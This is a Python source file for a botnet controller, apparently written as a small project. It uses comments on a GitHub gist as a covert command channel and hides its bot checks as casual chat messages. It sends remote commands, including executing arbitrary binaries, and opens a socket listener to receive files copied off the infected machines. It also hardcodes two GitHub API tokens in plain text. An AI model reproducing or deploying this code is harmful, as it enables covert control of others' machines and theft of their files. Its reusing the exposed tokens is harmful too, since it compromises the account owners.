from simplegist import Simplegist
import random
import time
import threading
import socket
import tqdm
import os


def listenForFiles():
    SERVER_HOST = "10.0.0.59"
    SERVER_PORT = 5001
    BUFFER_SIZE = 4096
    SEPARATOR = "<SEPARATOR>"
    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(10)
    print("[*] Listening as " + str(SERVER_HOST)+":"+ str(SERVER_PORT))
    ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveQuestion))
    beforeAsking = len(ghGist.comments().listall(name='secret.txt'))
    time.sleep(6)
    afterAsking = len(ghGist.comments().listall(name='secret.txt'))
    botsAlive = afterAsking - beforeAsking
    print("Receiving " + str(botsAlive) + " files")
    for i in range(0, botsAlive):
        client_socket, address = s.accept() 
        print("[+] " + str(address) + " is connected.")
        received = client_socket.recv(BUFFER_SIZE).decode()
        print (received)
        filename, filesize = received.split(SEPARATOR)
        filename = os.path.basename(filename)
        #print(filename)
        #print(filesize)
        filesize = int(filesize)
        
        progress = tqdm.tqdm(range(filesize), "Receiving "+ str(filename), unit="B", unit_scale=True, unit_divisor=1024)
            
        with open("copiedFiles/"+filename, "wb") as f:
            while True:
                    
                bytes_read = client_socket.recv(BUFFER_SIZE)
                if not bytes_read:    
                    break
                    
                f.write(bytes_read)
                    
                progress.update(len(bytes_read))


        client_socket.close()
        s.close()
        



ghGist = Simplegist(username='jirikdan', api_token='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')
GhgistBot = Simplegist(username='TheQfr', api_token='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')
botIsAliveQuestion = ["Im so bored, you there?", "I wanna talk, but noone is there to talk, or mby?", "Any1 up for some Fortnite?"]

## check if bots are alive periodically
def checkBots():
    while True:
        time.sleep(3000)
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveQuestion))
        beforeAsking = len(ghGist.comments().listall(name='secret.txt'))
        time.sleep(6)
        afterAsking = len(ghGist.comments().listall(name='secret.txt'))
        print("There are " + str(afterAsking - beforeAsking) + " alive Bots")
        time.sleep(30)

thread = threading.Thread(target=checkBots)
thread.daemon = True
thread.start()
#for i in range(4424529,4424429+300):
    #print(i)
    #ghGist.comments().delete(name='secret.txt', commentid=i)
    #GhgistBot.comments().delete(id='8b1ad9484c7acb95f0a72d4c6ece1f06', commentid=i)
  
while True:
    #command = raw_input("Paste your command or type HELP for help\n")
    command = raw_input("Type your command\n")
    if command == "HELP":
        print("w - (list of users currently logged in)")
        print("ls <PATH> (list content of specified directory)")
        print("id (if of current user)")
        print("Copy a file from the bot to the controller. The file name is specified")
        print("Execute a binary inside the bot given the name of the binary. Example: execute /usr/bin/ps")
    if command.startswith('execute'):
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
    if command.startswith('w'):
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
    if command.startswith('ls'):
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
    if command.startswith('copy'):
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
        threadListenForFiles = threading.Thread(target=listenForFiles)
        threadListenForFiles.daemon = True
        threadListenForFiles.start()